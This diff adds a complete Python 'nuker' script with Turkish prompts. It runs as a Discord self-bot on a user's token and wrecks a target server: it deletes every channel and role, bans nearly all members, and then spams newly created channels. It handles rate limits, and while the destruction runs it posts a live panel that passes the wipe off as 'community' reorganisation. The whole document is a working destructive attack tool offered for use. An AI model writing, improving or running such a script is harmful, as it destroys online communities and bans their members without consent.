@@ -1,0 +1,202 @@
+import discord
+from discord.ext import commands
+import asyncio
+import time
+import sys
+from colorama import Fore, Style, init
+
+# Renklendirmeyi Windows/Linux için aktif etme
+init(autoreset=True)
+
+print(f"{Fore.CYAN}=============================================")
+print(f"{Fore.MAGENTA}      👑 EMPIRE ADVANCED AUTO-SYSTEM 👑      ")
+print(f"{Fore.CYAN}============================================={Style.RESET_ALL}")
+
+# --- GİRİŞ VE YAPILANDIRMA BÖLÜMÜ ---
+token = input(f"{Fore.YELLOW}[?] Token giriniz: {Style.RESET_ALL}")
+
+try:
+    target_guild_id = int(input(f"{Fore.YELLOW}[?] Hedef Sunucu ID giriniz: {Style.RESET_ALL}"))
+    print(f"\n{Fore.BLUE}[⚙️] SÜRE AYARLARI (Örn: Ondalık sayılar için 0.7 veya tam sayılar için 1 yazabilirsiniz)")
+    
+    # Kullanıcının belirleyeceği dinamik süreler
+    kanal_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir KANAL silinsin?: {Style.RESET_ALL}"))
+    rol_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir ROL silinsin?: {Style.RESET_ALL}"))
+    uye_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir ÜYE yasaklansın?: {Style.RESET_ALL}"))
+    
+    print(f"\n{Fore.BLUE}[⚙️] YENİ KANAL AYARLARI (Aşama 4 için)")
+    kac_kanal_acilsin = int(input(f"{Fore.YELLOW}[?] Kaç adet yeni kanal açılsın?: {Style.RESET_ALL}"))
+    yeni_kanal_ismi = input(f"{Fore.YELLOW}[?] Yeni kanalların ismi ne olsun?: {Style.RESET_ALL}")
+
+except ValueError:
+    print(f"{Fore.RED}[HATA] Geçersiz giriş! ID ve kanal sayısı tam sayı, süreler ise sayı veya ondalıklı sayı olmalıdır.")
+    sys.exit()
+
+bot = commands.Bot(command_prefix="!", self_bot=True, help_command=None)
+
+# İstatistik Sayaçları
+silinen_kanal = 0
+silinen_rol = 0
+banlanan_uye = 0
+baslangic_zamani = time.time()
+
+def uptime_hesapla():
+    gecen_sure = int(time.time() - baslangic_zamani)
+    gun = gecen_sure // 86400
+    saat = (gecen_sure % 86400) // 3600
+    dakika = (gecen_sure % 3600) // 60
+    saniye = gecen_sure % 60
+    return f"{gun}g {saat}s {dakika}d {saniye}sn"
+
+def panel_olustur():
+    return (
+        "```\n"
+        "╔════════════════════════════════════════════╗\n"
+        "║          👑 **EMPIRE COMMUNITY** 👑          \n"
+        "╠════════════════════════════════════════════╣\n"
+        "║  > Projelerimiz ve yönetim tam gaz!        \n"
+        "║  > Düzenlemeler devam ediyor...            \n"
+        "╠════════════════════════════════════════════╣\n"
+        f"║  ❌ Silinen Kanal Sayısı : {str(silinen_kanal).ljust(16)}║\n"
+        f"║  ❌ Silinen Rol Sayısı   : {str(silinen_rol).ljust(16)}║\n"
+        f"║  🔨 Banlanan Üye Sayısı  : {str(banlanan_uye).ljust(16)}║\n"
+        f"║  ⏱️ Aktiflik Süresi      : {uptime_hesapla().ljust(16)}║\n"
+        "╚════════════════════════════════════════════╝\n"
+        "```"
+    )
+
+@bot.event
+async def on_ready():
+    global silinen_kanal, silinen_rol, banlanan_uye
+    
+    print(f"\n{Fore.GREEN}[*] Giriş Başarılı: {bot.user.name} ({bot.user.id})")
+    
+    guild = bot.get_guild(target_guild_id)
+    if not guild:
+        print(f"{Fore.RED}[HATA] Sunucu bulunamadı! ID'yi veya hesabın sunucuda olup olmadığını kontrol edin.")
+        await bot.close()
+        return
+
+    print(f"{Fore.GREEN}[+] Hedef Sunucu Doğrulandı: {guild.name}")
+    print(f"{Fore.LIGHTBLUE_EX}[i] Belirlenen süreler uygulanıyor -> Kanal: {kanal_gecikme}s | Rol: {rol_gecikme}s | Üye: {uye_gecikme}s")
+    print(f"{Fore.RED}[!] Sıralı optimizasyon süreci başlıyor...\n")
+
+    # Panel mesajı gönderme
+    panel_mesaji = None
+    for channel in guild.text_channels:
+        try:
+            panel_mesaji = await channel.send(panel_olustur())
+            print(f"{Fore.BLUE}[BİLGİ] Canlı İstatistik Paneli {channel.name} kanalına gönderildi.")
+            break
+        except:
+            continue
+
+    # Arka planda paneli güncelleyen asenkron görev
+    async def paneli_guncelle():
+        while not bot.is_closed():
+            if panel_mesaji:
+                try:
+                    await panel_mesaji.edit(content=panel_olustur())
+                except discord.errors.NotFound:
+                    break
+                except discord.errors.HTTPException as e:
+                    if e.status == 429:
+                        await asyncio.sleep(5)
+            await asyncio.sleep(2.5)
+
+    asyncio.create_task(paneli_guncelle())
+
+    # --- AŞAMA 1: KANALLARIN SİLİNMESİ ---
+    print(f"{Fore.YELLOW}➔ Aşama 1: Kanallar temizleniyor...")
+    channels_to_delete = list(guild.channels)
+    for channel in channels_to_delete:
+        if panel_mesaji and channel.id == panel_mesaji.channel.id:
+            continue
+        try:
+            await channel.delete()
+            silinen_kanal += 1
+            print(f"{Fore.RED}[-] Kanal Silindi: {channel.name}")
+        except discord.errors.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
+                print(f"{Fore.MAGENTA}[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                await asyncio.sleep(retry_after)
+        except Exception:
+            print(f"{Fore.LIGHTBLACK_EX}[İptal] Yetki yetmedi: {channel.name}")
+        
+        await asyncio.sleep(kanal_gecikme)
+
+    # --- AŞAMA 2: ROLLERİN SİLİNMESİ ---
+    print(f"\n{Fore.YELLOW}➔ Aşama 2: Roller temizleniyor...")
+    roles_to_delete = list(guild.roles)
+    for role in roles_to_delete:
+        if role.name != "@everyone" and not role.managed:
+            try:
+                await role.delete()
+                silinen_rol += 1
+                print(f"{Fore.RED}[-] Rol Silindi: {role.name}")
+            except discord.errors.HTTPException as e:
+                if e.status == 429:
+                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
+                    print(f"{Fore.MAGENTA}[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                    await asyncio.sleep(retry_after)
+            except Exception:
+                print(f"{Fore.LIGHTBLACK_EX}[İptal] Yetki yetmedi: {role.name}")
+            
+            await asyncio.sleep(rol_gecikme)
+
+    # --- AŞAMA 3: ÜYELERİN BANLANMASI ---
+    print(f"\n{Fore.YELLOW}➔ Aşama 3: Üyeler yasaklanıyor...")
+    members_to_ban = list(guild.members)
+    for member in members_to_ban:
+        if member.id != bot.user.id and member.id != guild.owner_id:
+            try:
+                await member.ban(reason="Empire System Clean")
+                banlanan_uye += 1
+                print(f"{Fore.GREEN}[+] Yasaklandı: {member.name}")
+            except discord.errors.HTTPException as e:
+                if e.status == 429:
+                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
+                    print(f"{Fore.MAGENTA}[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                    await asyncio.sleep(retry_after)
+            except Exception:
+                print(f"{Fore.LIGHTBLACK_EX}[İptal] Yetki yetmedi: {member.name}")
+            
+            await asyncio.sleep(uye_gecikme)
+
+    # Bitişte panel kanalını temizleme
+    if panel_mesaji:
+        try:
+            await panel_mesaji.channel.delete()
+            print(f"{Fore.BLUE}[BİLGİ] Panel kanalı görevini tamamladı.")
+        except:
+            pass
+
+    # --- AŞAMA 4: YENİ KANALLARIN OLUŞTURULMASI ---
+    print(f"\n{Fore.YELLOW}➔ Aşama 4: Yeni kanallar oluşturuluyor...")
+    
+    for i in range(kac_kanal_acilsin): 
+        try:
+            yeni_kanal = await guild.create_text_channel(name=yeni_kanal_ismi)
+            print(f"{Fore.GREEN}[+] Kanal Oluşturuldu ({i+1}/{kac_kanal_acilsin}): {yeni_kanal.name}") 
+            
+        except discord.errors.HTTPException as e:
+            if e.status == 429:
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
+                print(f"{Fore.MAGENTA}[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                await asyncio.sleep(retry_after)
+        except Exception as e:
+            print(f"{Fore.LIGHTBLACK_EX}[İptal] Kanal oluşturulamadı: {e}")
+        
+        await asyncio.sleep(1.0)
+
+    print(f"\n{Fore.GREEN}=============================================")
+    print(f"{Fore.GREEN}[*] TÜM OPERASYON BAŞARIYLA TAMAMLANDI!")
+    print(f"{Fore.GREEN}=============================================")
+
+try:
+    bot.run(token)
+except discord.LoginFailure:
+    print(f"\n{Fore.RED}[HATA] Girilen token geçersiz!")
+except Exception as e:
+    print(f"\n{Fore.RED}[HATA] Beklenmedik bir sorun oluştu: {e}")
